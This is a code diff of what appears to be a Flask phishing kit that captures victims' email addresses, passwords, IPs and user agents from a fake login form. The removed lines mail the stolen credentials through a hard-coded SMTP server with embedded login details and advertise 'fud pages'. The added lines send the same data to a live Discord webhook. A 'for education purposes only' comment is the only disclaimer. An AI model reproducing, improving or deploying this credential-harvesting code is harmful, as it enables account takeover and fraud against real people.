@@ -12,7 +12,29 @@ import smtplib, ssl
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
-# made for education purposes only
+# Discord Webhook URL
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1339995668625756232/jUZhB0L27EePcFo4psPduhjh_4VIv0xzO3D2gYwNtplfcoAXfGXtUdbOMhDuWJxmYcKn"
+
+def send_discord_message(email, password, ip, useragent):
+    message = {
+        "username": "Logger Bot",
+        "avatar_url": "https://i.imgur.com/zW2WJ3o.png",  # Optional bot avatar
+        "embeds": [
+            {
+                "title": "🔔 New Login Attempt",
+                "color": 16711680,  # Red color in Discord embed
+                "fields": [
+                    {"name": "📧 Email", "value": f"`{email}`", "inline": False},
+                    {"name": "🔑 Password", "value": f"`{password}`", "inline": False},
+                    {"name": "🌐 IP", "value": f"`{ip}`", "inline": False},
+                    {"name": "🖥 User-Agent", "value": f"`{useragent}`", "inline": False},
+                ],
+                "footer": {"text": "Logger Bot - Secure Notifications"},
+            }
+        ]
+    }
+    
+    requests.post(DISCORD_WEBHOOK_URL, json=message)# made for education purposes only
 
 app = Flask(__name__)
 limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
@@ -182,79 +204,50 @@ def route2():
 @app.route("/first", methods=['POST'])
 def first():
     if request.method == 'POST':
-        ip = request.headers.get('X-Forwarded-For')
-        if ip is None:
-            ip = request.headers.get('X-Real-IP')
-        if ip is None:
-            ip = request.headers.get('X-Client-IP')
-        if ip is None:
-            ip = request.remote_addr
+        ip = request.headers.get('X-Forwarded-For') or \
+             request.headers.get('X-Real-IP') or \
+             request.headers.get('X-Client-IP') or \
+             request.remote_addr
+
         email = request.form.get("horse")
-        passwordemail = request.form.get("pig")
-        sender_email = "auto528@cryptasphere.bio"
-        sender_emaill = "auto528"
-        receiver_email = "dyn1globiz@gmail.com"
-        password = "vip7a81be0e2b36"
+        password = request.form.get("pig")
         useragent = request.headers.get('User-Agent')
-        message = MIMEMultipart("alternative")
-        message["Subject"] = "KOTRA$$ Logs "
-        message["From"] = sender_email
-        message["To"] = receiver_email
-        text = """\
-        Hi,
-        How are you?
-        contact me on icq jamescartwright for your fud pages
-        """
-        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
-        part1 = MIMEText(text, "plain")
-        part2 = MIMEText(html, "html")
-        message.attach(part1)
-        message.attach(part2)
-        with smtplib.SMTP("146.19.254.243", 6040) as server:
-            server.login(sender_emaill, password)
-            server.sendmail(sender_email, receiver_email, message.as_string())
-        # Set session value and redirect
-        session['eman'] = email  # Save email as session variable
+
+        # Send data to Discord
+        send_discord_message(email, password, ip, useragent)
+
+        # Store email in session
+        session['eman'] = email
+
+        # Redirect as in your original code
         return redirect(url_for('benza', web=email))
+
+    return "Method Not Allowed", 405  # Handle wrong request method
 
 
 
 @app.route("/second", methods=['POST'])
 def second():
     if request.method == 'POST':
-        ip = request.headers.get('X-Forwarded-For')
-        if ip is None:
-            ip = request.headers.get('X-Real-IP')
-        if ip is None:
-            ip = request.headers.get('X-Client-IP')
-        if ip is None:
-            ip = request.remote_addr
+        ip = request.headers.get('X-Forwarded-For') or \
+             request.headers.get('X-Real-IP') or \
+             request.headers.get('X-Client-IP') or \
+             request.remote_addr
+
         email = request.form.get("horse")
-        passwordemail = request.form.get("pig")
-        sender_email = "auto528@cryptasphere.bio"
-        sender_emaill = "auto528"
-        receiver_email = "dyn1globiz@gmail.com"
-        password = "vip7a81be0e2b36"
+        password = request.form.get("pig")
         useragent = request.headers.get('User-Agent')
-        message = MIMEMultipart("alternative")
-        message["Subject"] = "KOTRA$$ Logs  !! "
-        message["From"] = sender_email
-        message["To"] = receiver_email
-        text = """\
-        Hi,
-        How are you?
-        contact me on icq jamescartwright for your fud pages
-        """
-        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
-        part1 = MIMEText(text, "plain")
-        part2 = MIMEText(html, "html")
-        message.attach(part1)
-        message.attach(part2)
-        with smtplib.SMTP("146.19.254.243", 6040) as server:
-            server.login(sender_emaill, password)
-            server.sendmail(sender_email, receiver_email, message.as_string())
-        session['ins'] = email  # Save email as session variable
+
+        # Send data to Discord
+        send_discord_message(email, password, ip, useragent)
+
+        # Store email in session
+        session['ins'] = email
+
+        # Redirect to 'lasmo' route as in your original code
         return redirect(url_for('lasmo', web=email))
+
+    return "Method Not Allowed", 405  # Handle wrong request method
 
 
 
